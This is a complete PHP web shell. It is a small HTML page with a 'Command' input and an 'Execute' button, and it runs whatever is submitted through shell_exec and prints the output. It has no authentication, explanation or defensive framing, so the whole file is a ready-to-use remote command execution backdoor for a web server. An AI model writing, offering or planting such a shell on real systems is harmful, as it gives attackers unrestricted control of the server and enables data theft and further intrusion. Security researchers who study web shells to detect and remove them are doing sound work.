<html>
<body>

    <form method="post" action="">
        Command: <input type="text" name="command" autofocus>
        <button type="submit">Execute</button>
    </form>

    <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $command = shell_exec($_POST["command"] . " 2>&1");
            # Command output.
            echo "<pre>$command</pre>";
        }
    ?>

</body>
</html>
